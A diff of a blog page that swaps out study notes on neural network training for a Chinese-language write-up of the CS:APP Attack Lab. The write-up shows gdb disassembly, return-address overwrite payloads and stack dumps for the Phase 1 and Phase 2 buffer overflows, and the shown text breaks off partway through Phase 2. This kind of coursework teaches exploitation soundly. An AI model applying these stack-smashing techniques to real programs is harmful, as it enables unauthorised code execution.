@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="NeuralNet," />
+  <meta name="keywords" content="CSAPP," />
 
 
 
@@ -79,46 +79,18 @@
 
 
 
-<meta name="description" content="ch-3 Improving the way neural networks learn The techniques we’ll develop in this chapter include  a better choice of cost function, the cross-entropy cost function; four so-called “regularization” m">
-<meta name="keywords" content="NeuralNet">
+<meta name="description" content="[CS:APP-ch3] Attack Lab  Part 1：缓冲区溢出攻击  Phase  1 1 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbu">
+<meta name="keywords" content="CSAPP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[NN&amp;DL-ch3] Improving the way neural networks learn">
-<meta property="og:url" content="http://yoursite.com/2018/04/15/NeuralNet/3/index.html">
+<meta property="og:title" content="[CS:APP-ch3] Attack Lab">
+<meta property="og:url" content="http://yoursite.com/2017/08/30/CSAPP/attack/index.html">
 <meta property="og:site_name" content="Aria">
-<meta property="og:description" content="ch-3 Improving the way neural networks learn The techniques we’ll develop in this chapter include  a better choice of cost function, the cross-entropy cost function; four so-called “regularization” m">
+<meta property="og:description" content="[CS:APP-ch3] Attack Lab  Part 1：缓冲区溢出攻击  Phase  1 1 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbu">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-13_06-08-17.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-13_06-12-32.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-13_06-22-52.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-13_06-23-37.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-16_05-25-49.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-16_05-39-16.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-16_05-46-28.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-16_05-56-06.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-09-23.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-13-09.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-31-41.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-34-29.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-34-40.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-38-21.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_14-36-53.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_14-37-21.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_14-47-37.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_15-01-47.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-08-29.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-33-45.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-47-58.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-48-04.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-52-55.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_16-05-02.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866346/Screenshot_from_2018-04-16_16-05-09.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_16-07-11.png">
-<meta property="og:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866346/Screenshot_from_2018-04-16_16-07-17.png">
-<meta property="og:updated_time" content="2018-05-25T12:31:05.565Z">
+<meta property="og:updated_time" content="2018-10-16T12:01:49.995Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[NN&amp;DL-ch3] Improving the way neural networks learn">
-<meta name="twitter:description" content="ch-3 Improving the way neural networks learn The techniques we’ll develop in this chapter include  a better choice of cost function, the cross-entropy cost function; four so-called “regularization” m">
-<meta name="twitter:image" content="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-13_06-08-17.png">
+<meta name="twitter:title" content="[CS:APP-ch3] Attack Lab">
+<meta name="twitter:description" content="[CS:APP-ch3] Attack Lab  Part 1：缓冲区溢出攻击  Phase  1 1 2 3 4 5 6 7 8 9 [--------------------------code-----------------------]    0x4017a5:	nop    0x4017a6:	nop    0x4017a7:	nop =&amp;gt; 0x4017a8 &amp;lt;getbu">
 
 
 
@@ -148,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/04/15/NeuralNet/3/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/08/30/CSAPP/attack/"/>
 
 
 
 
 
-  <title>[NN&DL-ch3] Improving the way neural networks learn | Aria</title>
+  <title>[CS:APP-ch3] Attack Lab | Aria</title>
   
 
 
@@ -328,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/15/NeuralNet/3/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/30/CSAPP/attack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Aria">
@@ -345,7 +317,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">[NN&DL-ch3] Improving the way neural networks learn</h1>
+          <h1 class="post-title" itemprop="name headline">[CS:APP-ch3] Attack Lab</h1>
         
 
         <div class="post-meta">
@@ -357,8 +329,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-15T20:38:47+08:00">
-                2018-04-15
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-30T13:27:51+08:00">
+                2017-08-30
               </time>
             
 
@@ -380,8 +352,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Neural-Networks-and-Deep-Learning/" itemprop="url" rel="index">
-                    <span itemprop="name">Neural Networks and Deep Learning</span>
+                  <a href="/categories/Computer-System-a-Programmer-s-Perspective/" itemprop="url" rel="index">
+                    <span itemprop="name">Computer System a Programmer's Perspective</span>
                   </a>
                 </span>
 
@@ -398,9 +370,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/04/15/NeuralNet/3/#comments" itemprop="discussionUrl">
+                <a href="/2017/08/30/CSAPP/attack/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/04/15/NeuralNet/3/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2017/08/30/CSAPP/attack/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -433,275 +405,242 @@
       
 
       
-        <h2 id="ch-3-improving-the-way-neural-networks-learn"><a class="markdownIt-Anchor" href="#ch-3-improving-the-way-neural-networks-learn"></a> ch-3 Improving the way neural networks learn</h2>
-<p>The techniques we’ll develop in this chapter include</p>
-<ul>
-<li>a better choice of <strong>cost function</strong>, the cross-entropy cost function;</li>
-<li>four so-called <strong>“regularization”</strong> methods ( L1 and L2 regularization, dropout, and artificial expansion of the training data ), which make our networks better at generalizing beyond the training data;</li>
-<li>a better method for <strong>initializing the weights</strong> in the network;</li>
-<li>a set of heuristics to help choose <strong>good hyper-parameters</strong> ;</li>
-</ul>
-<a id="more"></a>
-<br>
-<h3 id="the-cross-entropy-cost-function"><a class="markdownIt-Anchor" href="#the-cross-entropy-cost-function"></a> The cross-entropy cost function</h3>
-<p><strong>Problem of quadratic function</strong></p>
-<p>Artificial neuron has a lot of difficulty learning when it’s badly wrong</p>
-<p>w = b = 2.0,  η = 0.15</p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-13_06-08-17.png" alt=""></p>
-<br>
-<p>Quadratic cost function $ C = \frac { (y-a) ^ 2 }{ 2 }  $</p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-13_06-12-32.png" alt=""></p>
-<ul>
-<li>when the neuron’s output is close to 1  ( might be far away from the desired output )</li>
-<li>the curve gets very flat, so $ σ′(z) $ gets very small.</li>
-<li>so $ ∂C/∂w $ and $ ∂C/∂b $ get very small.</li>
-</ul>
-<br>
-<p><strong>Introducing cross-entropy</strong></p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-13_06-22-52.png" alt=""></p>
-<p>where $ a = σ(z) $ and $ z= \Sigma_j w_jx_j + b $</p>
-<ol>
-<li>It’s a cost function :</li>
-</ol>
-<ul>
-<li>non-negative</li>
-<li>close to zero when a close to y</li>
-</ul>
-<ol start="2">
-<li>avoids the problem of learning slowing down</li>
-</ol>
-<ul>
-<li>rates not controlled by $ σ’(z) $</li>
-</ul>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-13_06-23-37.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-16_05-25-49.png" alt=""></p>
-<br>
-<p>Using the <strong>quadratic cost</strong> when we have <strong>linear</strong> neurons in the output layer</p>
-<ul>
-<li>all the neurons in the final layer are <em>linear neurons</em></li>
-<li>outputs are simply $ a_j^L = y_j^L $, sigmoid not applied</li>
-<li>quadratic cost will not slowdown learning</li>
-</ul>
-<br>
-<h3 id="softmax"><a class="markdownIt-Anchor" href="#softmax"></a> Softmax</h3>
-<ul>
-<li>define a new type of <strong>output</strong> layer</li>
-<li>apply the so-called softmax function to z</li>
-</ul>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-16_05-39-16.png" alt=""></p>
-<p>output is a set of <strong>positive</strong> numbers <strong>which sum up to 1</strong>, can be thought of as a <strong>probability distribution</strong></p>
-<br>
-<p><strong>The learning slowdown problem</strong></p>
-<p><strong>log-likelihood</strong> cost function</p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-16_05-46-28.png" alt=""></p>
-<p>probability of $ a_y^L $ close to 1, cost close to 0</p>
-<p>$ δ_j ^L =  \partial C / \partial z_j^L $</p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866343/Screenshot_from_2018-04-16_05-56-06.png" alt=""></p>
-<br>
-<h3 id="overfitting"><a class="markdownIt-Anchor" href="#overfitting"></a> Overfitting</h3>
-<p><strong>cost</strong> on the <strong>training data</strong> continue decrease while</p>
-<p>classification <strong>accuracy</strong> on the <strong>test data</strong> stops</p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-09-23.png" alt=""></p>
-<p><strong>cost</strong> on the <strong>test data</strong> starts increase while</p>
-<p>classification <strong>accuracy</strong> on <strong>training data</strong> rises up to 100%</p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-13-09.png" alt=""></p>
-<p><em>It’s almost as though our network is <strong>merely memorizing</strong> the <strong>training</strong> set, without understanding digits well enough to generalize to the test set.</em></p>
-<br>
-<p>Detect overfitting</p>
-<ul>
-<li>keeping track of accuracy on the test data as our network trains.</li>
-<li>using validation data: we may find hyper-parameters which fit particular peculiarities of the test_data if using test_data for detection.</li>
-<li><em>early stopping</em>: stop training when accuracy no longer improving</li>
-<li><em>hold out method</em>: validation_data is kept apart or “held out” from the training_data</li>
-</ul>
-<br>
-<p><strong>Avoid overfitting</strong></p>
-<ul>
-<li>one of the <strong>best</strong> ways: increase the <strong>size</strong> of the training data</li>
-<li>regularization</li>
-</ul>
-<br>
-<h3 id="regularization"><a class="markdownIt-Anchor" href="#regularization"></a> Regularization</h3>
-<h4 id="l2-regularization-weight-decay"><a class="markdownIt-Anchor" href="#l2-regularization-weight-decay"></a> L2 regularization ( weight decay )</h4>
-<p>add an extra term on cost function</p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-31-41.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-34-29.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-34-40.png" alt=""></p>
-<ul>
-<li>Intuitively, the effect of regularization is to make it so the network <strong>prefers to learn small weights</strong></li>
-<li>λ : compromising between finding small weights and minimizing the original cost function</li>
-<li>$ -\frac{ηλ}{n}*w  $ weights shrink by an amount <strong>proportional</strong> to w</li>
-</ul>
-<br>
-<p>Why does regularization help reduce overfitting?</p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_13-38-21.png" alt=""></p>
-<p><em>the 9th order model is really just learning the effects of <strong>local noise</strong></em></p>
-<ul>
-<li>The smallness of the <strong>weights</strong> means that the network <strong>won’t change too much</strong> if we change a few random inputs here and there</li>
-<li>having a large <strong>bias</strong> doesn’t make a neuron sensitive to its inputs in the same way as having large weights</li>
-</ul>
-<p>We don’t have an entirely satisfactory systematic understanding of what’s going on, <strong>merely incomplete heuristics</strong> and rules of thumb.</p>
-<br>
-<h4 id="l1-regularization"><a class="markdownIt-Anchor" href="#l1-regularization"></a> L1 regularization</h4>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_14-36-53.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_14-37-21.png" alt=""></p>
-<ul>
-<li>$ -\frac{ηλ}{n} * sgn(w) $weights shrink by a <strong>constant</strong> amount toward 0</li>
-<li>when $|w| $ is large, shrink less; when $ |w| $ is small, shrink more</li>
-</ul>
-<br>
-<h4 id="dropout"><a class="markdownIt-Anchor" href="#dropout"></a> Dropout</h4>
-<p><strong>modify the network itself</strong> rather than modifying the cost function</p>
-<ul>
-<li>start by <strong>randomly deleting half the hidden neurons</strong></li>
-</ul>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_14-47-37.png" alt=""></p>
-<ul>
-<li>forward-propagate the input and backpropagate the result, update network</li>
-<li>choosing a new random subset,  repeat;</li>
-<li>Finally, run the full network by <strong>halving</strong> all weights.</li>
-</ul>
-<br>
-<p>Heuristic</p>
-<ul>
-<li><strong>Averaging</strong> the effects of <strong>a large number of</strong> different networks</li>
-<li>a neuron cannot <strong>rely on</strong> particular other neurons, <strong>robust</strong> to losing any individual connection</li>
-</ul>
-<br>
-<h4 id="artificially-expanding-the-training-data"><a class="markdownIt-Anchor" href="#artificially-expanding-the-training-data"></a> Artificially expanding the training data</h4>
-<p>The general principle is to expand the training data by applying operations that <strong>reflect real-world variation</strong>.</p>
-<br>
-<p><strong>An aside on big data and what it means to compare classification accuracies</strong></p>
-<p><strong>more training data</strong> can sometimes compensate for differences in the machine learning algorithm used</p>
-<br>
-<h3 id="weight-initialization"><a class="markdownIt-Anchor" href="#weight-initialization"></a> Weight initialization</h3>
-<p><em>Up to now</em></p>
-<ul>
-<li>choose w &amp; b using independent <em>Gaussian random variables</em></li>
-<li>mean 0 and standard deviation 1</li>
-<li>while z <strong>sum up</strong> over a total of 501 normalized Gaussian random variables</li>
-<li>z will have a very broad Gaussian distribution</li>
-</ul>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866344/Screenshot_from_2018-04-16_15-01-47.png" alt=""></p>
-<br>
-<p>An easy way</p>
-<ul>
-<li>initialize more sharply peak</li>
-<li>mean 0 and standard deviation $ 1 / \sqrt {n_{in}} $</li>
-<li>seems only speeds up learning, doesn’t change the final performance</li>
-</ul>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-08-29.png" alt=""></p>
-<br>
-<p><strong>Connection with Regularization</strong></p>
-<ul>
-<li>L2 regularization sometimes automatically gives us something similar to the new approach to weight initialization</li>
-</ul>
-<br>
-<h3 id="handwriting-recognition-revisited-the-code"><a class="markdownIt-Anchor" href="#handwriting-recognition-revisited-the-code"></a> Handwriting recognition revisited: the code</h3>
-<br>
-<br>
-<h3 id="how-to-choose-a-neural-networks-hyper-parameters"><a class="markdownIt-Anchor" href="#how-to-choose-a-neural-networks-hyper-parameters"></a> How to choose a neural network’s hyper-parameters?</h3>
-<p>Problem when choose η=10.0 and λ=1000.0</p>
-<ul>
-<li>classification accuracies are no better than <strong>chance</strong></li>
-</ul>
-<br>
-<p><strong>Broad strategy</strong></p>
-<ul>
-<li>examine network to achieve results better than chance</li>
-</ul>
-<p>Speed up experimentation</p>
-<ul>
-<li>stripping network down to the <strong>simplest</strong></li>
-<li>increasing the <strong>frequency of monitoring</strong></li>
-</ul>
-<p>When having a signal</p>
-<ul>
-<li>
-<p>gradually decrease the frequency of monitoring</p>
-</li>
-<li>
-<p>experiment with a more complex architecture, adjust  η and λ again</p>
-</li>
-</ul>
-<br>
-<p><strong>Learning Rate</strong></p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-33-45.png" alt=""></p>
-<ul>
-<li>First estimate the <strong>order of threshold</strong> for η so that <strong>training cost</strong> won’t oscillating or increasing</li>
-<li>control the step size in gradient descent, no need to monitor by accuracy</li>
-</ul>
-<br>
-<p><strong>Number of training Epochs</strong></p>
-<p>Early stopping</p>
-<ul>
-<li>terminate when classification on validation data stops improving</li>
-</ul>
-<br>
-<p><strong>Learning rate schedule</strong></p>
-<ul>
-<li>μ=0 there’s a lot of friction, the velocity can’t build upuse a large learning rate when weights are badly wrong</li>
-<li>later reduce as we make more fine-tuned adjustments</li>
-</ul>
-<br>
-<p><strong>The regularization parameter, λ</strong></p>
-<ul>
-<li>starting initially λ=0.0 to determine 	η</li>
-<li>increase or decrease by factors of 10, get a fine-tune</li>
-<li>return and re-optimize η again</li>
-</ul>
-<br>
-<p><strong>Mini-batch size</strong></p>
-<ul>
-<li>it’s possible to use <strong>matrix techniques</strong> to compute the gradient update for <em>all</em> examples in a mini-batch simultaneously</li>
-<li>using the larger mini-batch would speed things up</li>
-</ul>
-<br>
-<h3 id="other-techniques"><a class="markdownIt-Anchor" href="#other-techniques"></a> Other techniques</h3>
-<p>####Variations on stochastic gradient descent</p>
-<p><strong>Hessian technique</strong></p>
-<p>incorporates not just the gradient, but also information about <strong>how the gradient is changing</strong></p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-47-58.png" alt=""></p>
-<p>$ H $ is a matrix known as the <em>Hessian matrix</em>, whose $ jkth $ entry is $ ∂^2C/∂w_j∂w_k $</p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-48-04.png" alt=""></p>
-<ul>
-<li>the sheer <strong>size</strong> of the Hessian matrix make it difficult to compute</li>
-</ul>
-<br>
-<p><strong>Momentum-based gradient descent</strong></p>
-<p>introduces a notion of “velocity” and “friction”</p>
-<ul>
-<li>replace the gradient descent update rule $ w→w′=w−η∇C$  by</li>
-</ul>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_15-52-55.png" alt=""></p>
-<ul>
-<li>
-<p>the “force” ∇C is now modifying v, and the velocity is controlling the rate of change of w.</p>
-</li>
-<li>
-<p>1−μ as the amount of friction in the system.</p>
-</li>
-<li>
-<p>μ=1, there is no friction;  μ=0 there’s a lot of friction, the velocity can’t build up;</p>
-  <br>	
-</li>
-</ul>
-<h4 id="other-models-of-artificial-neuron"><a class="markdownIt-Anchor" href="#other-models-of-artificial-neuron"></a> Other models of artificial neuron</h4>
-<p><strong>tanh neuron</strong></p>
-<ul>
-<li>ranges from -1 to 1, not 0 to 1</li>
-<li>allows both positive and negative activations</li>
-<li>the activations in hidden layers would be equally balanced</li>
-</ul>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_16-05-02.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866346/Screenshot_from_2018-04-16_16-05-09.png" alt=""></p>
-<br>
-<p><strong>Rectified linear unit</strong></p>
-<ul>
-<li>never cause saturate, no corresponding learning slowdown</li>
-</ul>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866345/Screenshot_from_2018-04-16_16-07-11.png" alt=""></p>
-<p><img src="https://res.cloudinary.com/dsmx9qa2z/image/upload/v1523866346/Screenshot_from_2018-04-16_16-07-17.png" alt=""></p>
+        <h2 id="csapp-ch3-attack-lab"><a class="markdownIt-Anchor" href="#csapp-ch3-attack-lab"></a> [CS:APP-ch3] Attack Lab</h2>
+<h2 id="part-1缓冲区溢出攻击"><a class="markdownIt-Anchor" href="#part-1缓冲区溢出攻击"></a> Part 1：缓冲区溢出攻击</h2>
+<h3 id="phase-1"><a class="markdownIt-Anchor" href="#phase-1"></a> Phase  1</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+<span class="line">4</span>
+<span class="line">5</span>
+<span class="line">6</span>
+<span class="line">7</span>
+<span class="line">8</span>
+<span class="line">9</span>
+</pre></td><td class="code"><pre><span class="line">[--------------------------code-----------------------]</span>
+<span class="line">   <span class="number">0x4017a5</span>:	nop</span>
+<span class="line">   <span class="number">0x4017a6</span>:	nop</span>
+<span class="line">   <span class="number">0x4017a7</span>:	nop</span>
+<span class="line">=&gt; <span class="number">0x4017a8</span> &lt;getbuf&gt;:	sub    $<span class="number">0x28</span>,%rsp</span>
+<span class="line">   <span class="number">0x4017ac</span> &lt;getbuf+<span class="number">4</span>&gt;:	mov    %rsp,%rdi</span>
+<span class="line">   <span class="number">0x4017af</span> &lt;getbuf+<span class="number">7</span>&gt;:	callq  <span class="number">0x401a40</span> &lt;Gets&gt;</span>
+<span class="line">   <span class="number">0x4017b4</span> &lt;getbuf+<span class="number">12</span>&gt;:	mov    $<span class="number">0x1</span>,%eax</span>
+<span class="line">   <span class="number">0x4017b9</span> &lt;getbuf+<span class="number">17</span>&gt;:	add    $<span class="number">0x28</span>,%rsp</span>
+</pre></td></tr></table></figure>
+<p>buf开创0x28 = 40 个字节<br>
+随便填充40个字符</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+<span class="line">4</span>
+<span class="line">5</span>
+<span class="line">6</span>
+<span class="line">7</span>
+<span class="line">8</span>
+<span class="line">9</span>
+<span class="line">10</span>
+</pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> function touch1:</span>
+<span class="line">   <span class="number">0x00000000004017c0</span> &lt;+<span class="number">0</span>&gt;:	sub    $<span class="number">0x8</span>,%rsp</span>
+<span class="line">   <span class="number">0x00000000004017c4</span> &lt;+<span class="number">4</span>&gt;:	movl   $<span class="number">0x1</span>,<span class="number">0x202d0e</span>(%rip)        # <span class="number">0x6044dc</span> &lt;vlevel&gt;</span>
+<span class="line">   <span class="number">0x00000000004017ce</span> &lt;+<span class="number">14</span>&gt;:	mov    $<span class="number">0x4030c5</span>,%edi</span>
+<span class="line">   <span class="number">0x00000000004017d3</span> &lt;+<span class="number">19</span>&gt;:	callq  <span class="number">0x400cc0</span> &lt;<span class="built_in">puts</span>@plt&gt;</span>
+<span class="line">   <span class="number">0x00000000004017d8</span> &lt;+<span class="number">24</span>&gt;:	mov    $<span class="number">0x1</span>,%edi</span>
+<span class="line">   <span class="number">0x00000000004017dd</span> &lt;+<span class="number">29</span>&gt;:	callq  <span class="number">0x401c8d</span> &lt;validate&gt;</span>
+<span class="line">   <span class="number">0x00000000004017e2</span> &lt;+<span class="number">34</span>&gt;:	mov    $<span class="number">0x0</span>,%edi</span>
+<span class="line">   <span class="number">0x00000000004017e7</span> &lt;+<span class="number">39</span>&gt;:	callq  <span class="number">0x400e40</span> &lt;<span class="built_in">exit</span>@plt&gt;</span>
+<span class="line">End of assembler dump.</span>
+</pre></td></tr></table></figure>
+<p>touch1的地址是0x4017c0<br>
+因为是little endian的机器所以将<br>
+c0 17 40 00 00 00 00 00<br>
+用hex2raw转化为字符，添加到40个a的后面就行了</p>
+<p>结果：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+<span class="line">4</span>
+<span class="line">5</span>
+<span class="line">6</span>
+<span class="line">7</span>
+<span class="line">8</span>
+<span class="line">9</span>
+</pre></td><td class="code"><pre><span class="line">[-----------<span class="built_in">stack</span>--------------]</span>
+<span class="line"><span class="number">0000</span>| <span class="number">0x5561dc78</span> (<span class="string">'a'</span> &lt;repeats <span class="number">40</span> times&gt;, <span class="string">"\300\027@"</span>)</span>
+<span class="line"><span class="number">0008</span>| <span class="number">0x5561dc80</span> (<span class="string">'a'</span> &lt;repeats <span class="number">32</span> times&gt;, <span class="string">"\300\027@"</span>)</span>
+<span class="line"><span class="number">0016</span>| <span class="number">0x5561dc88</span> (<span class="string">'a'</span> &lt;repeats <span class="number">24</span> times&gt;, <span class="string">"\300\027@"</span>)</span>
+<span class="line"><span class="number">0024</span>| <span class="number">0x5561dc90</span> (<span class="string">'a'</span> &lt;repeats <span class="number">16</span> times&gt;, <span class="string">"\300\027@"</span>)</span>
+<span class="line"><span class="number">0032</span>| <span class="number">0x5561dc98</span> (<span class="string">"aaaaaaaa\300\027@"</span>)</span>
+<span class="line"><span class="number">0040</span>| <span class="number">0x5561dca0</span> --&gt; <span class="number">0x4017c0</span> (&lt;touch1&gt;:	sub    $<span class="number">0x8</span>,%rsp)</span>
+<span class="line"><span class="number">0048</span>| <span class="number">0x5561dca8</span> --&gt; <span class="number">0x0</span> </span>
+<span class="line"><span class="number">0056</span>| <span class="number">0x5561dcb0</span> --&gt; <span class="number">0x401f24</span> (&lt;launch+<span class="number">112</span>&gt;:	cmpl   $<span class="number">0x0</span>,<span class="number">0x2025bd</span>(%rip)        # <span class="number">0x6044e8</span> &lt;is_checker&gt;)</span>
+</pre></td></tr></table></figure>
+<h3 id="phase-2"><a class="markdownIt-Anchor" href="#phase-2"></a> Phase 2</h3>
+<p>touch2 有参数传递，要改变寄存器rdi里存放的值</p>
+<p>结果：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span>
+<span class="line">2</span>
+<span class="line">3</span>
+<span class="line">4</span>
+<span class="line">5</span>
+<span class="line">6</span>
+<span class="line">7</span>
+<span class="line">8</span>
+<span class="line">9</span>
+</pre></td><td class="code"><pre><span class="line">[---------------------<span class="built_in">stack</span>---------------------------]</span>
+<span class="line"><span class="number">0000</span>| <span class="number">0x5561dc78</span> (<span class="string">'a'</span> &lt;repeats <span class="number">40</span> times&gt;, <span class="string">"\260\334aU"</span>)</span>
+<span class="line"><span class="number">0008</span>| <span class="number">0x5561dc80</span> (<span class="string">'a'</span> &lt;repeats <span class="number">32</span> times&gt;, <span class="string">"\260\334aU"</span>)</span>
+<span class="line"><span class="number">0016</span>| <span class="number">0x5561dc88</span> (<span class="string">'a'</span> &lt;repeats <span class="number">24</span> times&gt;, <span class="string">"\260\334aU"</span>)</span>
+<span class="line"><span class="number">0024</span>| <span class="number">0x5561dc90</span> (<span class="string">'a'</span> &lt;repeats <span class="number">16</span> times&gt;, <span class="string">"\260\334aU"</span>)</span>
+<span class="line"><span class="number">0032</span>| <span class="number">0x5561dc98</span> (<span class="string">"aaaaaaaa\260\334aU"</span>)</span>
+<span class="line"><span class="number">0040</span>| <span class="number">0x5561dca0</span> --&gt; <span class="number">0x5561dcb0</span> --&gt; <span class="number">0xc359b997fac7c748</span> </span>
